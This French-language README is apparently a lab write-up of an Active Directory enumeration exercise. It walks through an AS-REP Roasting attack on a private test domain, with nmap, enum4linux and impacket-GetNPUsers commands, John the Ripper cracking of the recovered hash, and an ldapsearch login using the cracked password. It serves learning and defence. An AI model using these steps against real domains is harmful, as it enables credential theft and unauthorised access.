# AD Enumeration attack
# Active Directory Enumeration & Attacks

## Description du projet

Ce projet a pour objectif de comprendre les techniques d’énumération et d’exploitation dans un environnement Active Directory (AD).

L’environnement de laboratoire est composé de :

* Kali Linux (machine d’attaque)
* Windows Server 2019 (Domain Controller)
* Windows 11 Enterprise (poste client)

Toutes les attaques sont réalisées depuis Kali Linux contre le contrôleur de domaine Windows Server.

---

# Objectifs pédagogiques

À travers ce projet, nous avons appris à :

* Comprendre l’importance de l’énumération Active Directory
* Identifier les utilisateurs, groupes et services du domaine
* Exploiter des mauvaises configurations Kerberos
* Utiliser des outils d’attaque AD depuis Linux
* Interpréter les informations obtenues pendant l’énumération
* Identifier des vulnérabilités et mauvaises pratiques de sécurité
* Extraire des credentials et accéder à des informations LDAP sensibles

---

# Environnement utilisé

## Machines virtuelles

| Machine               | Rôle              |
| --------------------- | ----------------- |
| Kali Linux            | Machine d’attaque |
| Windows Server 2019   | Domain Controller |
| Windows 11 Enterprise | Machine victime   |

---

# Outils utilisés

* nmap
* enum4linux
* impacket-GetNPUsers
* hashcat
* john the ripper
* ldapsearch
* crackmapexec
* responder
* metasploit
* secretsdump.py

---

# Informations réseau

| Service           | Adresse IP     |
| ----------------- | -------------- |
| Domain Controller | 192.168.56.20  |
| Kali Linux        | 192.168.56.102 |

Domaine Active Directory :

```text
PENTESTLAB.local
```

---

# Task 0 — AS-REP Roasting

## Objectif

Identifier un compte Active Directory avec l’option “Do not require Kerberos preauthentication” activée, récupérer le hash Kerberos AS-REP puis cracker le mot de passe hors ligne.

---

## Étapes réalisées

### 1. Scan réseau

Découverte des machines présentes sur le réseau :

```bash
nmap -sn 192.168.56.0/24
```

---

### 2. Identification du Domain Controller

```bash
nmap -sV 192.168.56.20
```

Services détectés :

* LDAP
* Kerberos
* SMB
* WinRM

Le domaine identifié est :

```text
PENTESTLAB.local
```

---

### 3. Énumération Active Directory

```bash
enum4linux -a 192.168.56.20
```

Pendant l’énumération, un compte vulnérable a été découvert :

```text
legacy - no kerberos preauth
```

---

### 4. Récupération du hash AS-REP

```bash
impacket-GetNPUsers PENTESTLAB.local/legacy -dc-ip 192.168.56.20 -no-pass
```

Le hash Kerberos a été récupéré puis sauvegardé dans un fichier.

---

### 5. Crack du hash

Le mot de passe a été cracké avec John the Ripper :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Résultat :

```text
legacy:Password123
```

---

### 6. Authentification LDAP

Connexion LDAP avec les credentials récupérés :

```bash
ldapsearch -x -H ldap://192.168.56.20 \
-D "PENTESTLAB\\legacy" \
-w 'Password123' \
-b "DC=PENTESTLAB,DC=local" \
"(sAMAccountName=legacy)"
```

Le flag a été trouvé dans l’attribut LDAP :

```text
comment
```

---

# Résultat

Le flag récupéré a été sauvegardé dans :

```text
0-flag.txt
```

---

# Analyse sécurité

Cette attaque démontre les risques liés :

* aux comptes sans pré-authentification Kerberos
* aux mots de passe faibles
* aux mauvaises pratiques d’administration AD
* aux informations sensibles exposées dans LDAP

---
